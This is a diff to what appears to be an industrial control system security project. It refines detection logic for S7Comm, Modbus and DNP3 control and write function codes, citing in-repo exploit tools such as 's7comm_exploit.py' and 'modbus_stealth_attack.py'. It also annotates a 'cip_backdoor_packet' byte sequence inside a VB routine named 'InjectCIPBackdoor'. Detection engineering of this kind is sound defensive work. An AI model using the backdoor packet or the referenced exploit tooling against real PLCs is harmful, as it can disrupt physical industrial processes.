@@ -5135,6 +5135,8 @@ if (src_ip !in access_timeline) {
 access_timeline[src_ip][|access_timeline[src_ip]|] = fmt("S7Comm:%s", network_time());
 
 # Track control operations
+# Ref: tools/s7comm_security_framework/s7comm_exploit.py:63-64
+# PLC control function codes: 0x28 (PLC_CONTROL), 0x29 (PLC_STOP)
 if (header$function_code == 0x28 || header$function_code == 0x29) {
     if (src_ip !in control_operations) {
         control_operations[src_ip] = table();
@@ -5168,7 +5170,9 @@ if (src_ip !in access_timeline) {
 access_timeline[src_ip][|access_timeline[src_ip]|] = fmt("Modbus:%s", network_time());
 
 # Track control operations (write commands)
-if (headers$function_code >= 5 && headers$function_code <= 16) {
+# Ref: tools/modbus-stealth-toolkit/modbus_stealth_attack.py:87-97
+# Write function codes: 0x05, 0x06, 0x0F, 0x10, 0x15, 0x16, 0x17
+if (headers$function_code in set(5, 6, 15, 16, 21, 22, 23)) {
     if (src_ip !in control_operations) {
         control_operations[src_ip] = table();
     }
@@ -5201,7 +5205,9 @@ if (src_ip !in access_timeline) {
 access_timeline[src_ip][|access_timeline[src_ip]|] = fmt("DNP3:%s", network_time());
 
 # Track control operations
-if (message$function_code == 2 || message$function_code == 3) {
+# DNP3 function codes: 2 (WRITE), 3 (SELECT), 4 (OPERATE), 5 (DIRECT_OPERATE)
+# Ref: configs/suricata_rules/ics_malware_detection.rules (DNP3 detection rules)
+if (message$function_code == 2 || message$function_code == 4 || message$function_code == 5) {
     if (src_ip !in control_operations) {
         control_operations[src_ip] = table();
     }
@@ -8493,7 +8499,9 @@ Private Sub InjectCIPBackdoor(isSafeMode As Boolean)
     ' Assembly integration for low-level CIP manipulation
     Dim assemblyCIP As String
     assemblyCIP = "; CIP Protocol Manipulation - x86 Assembly" & vbCrLf & _
+                  "; Ref: tools/cip_security_assessment/cip_exploiter.py (CIPPacket structure)" & vbCrLf & _
                   "section .data" & vbCrLf & _
+                  "; EtherNet/IP header (0x6F 0x00) + CIP service code (0x52) + path bytes" & vbCrLf & _
                   "cip_backdoor_packet db 0x6F, 0x00, 0x52, 0x02, 0x20, 0x02, 0x24, 0x01" & vbCrLf & _
                   "packet_len equ $ - cip_backdoor_packet" & vbCrLf & _
                   "" & vbCrLf & _
